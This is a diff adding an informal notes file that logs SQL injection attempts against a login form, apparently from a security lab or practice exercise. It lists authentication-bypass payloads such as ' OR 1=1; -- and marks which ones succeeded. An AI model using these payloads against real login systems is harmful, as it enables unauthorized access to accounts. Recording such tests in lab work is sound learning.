@@ -1,0 +1,20 @@
+SQL Injection Attempts:
+  
+  User: ‘OR 1=1; --
+  Pass: ‘OR 1=1;--
+      Successful
+  
+  User: ‘OR 1=1;  /*
+  Pass: ‘OR 1=1; /*
+      Successful
+
+  Input username that was previously registered and add "#" to comment out password.
+      Unsuccessful
+  
+  User: admin
+  Pass: ' OR 1=1; --
+  (why 'admin'?)
+      Unsuccessful
+
+  Any valid username and SQL inject the password.
+    Successful?
